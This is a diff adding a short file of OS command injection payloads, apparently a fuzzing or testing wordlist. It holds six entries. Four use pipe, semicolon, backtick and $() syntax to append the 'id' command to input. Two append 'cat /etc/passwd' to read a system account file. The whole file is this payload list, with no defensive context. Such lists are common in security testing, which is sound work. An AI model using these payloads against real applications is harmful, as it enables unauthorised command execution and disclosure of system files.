@@ -1,0 +1,6 @@
+|id
+;id
+`id`
+$(id)
+| cat /etc/passwd
+; cat /etc/passwd
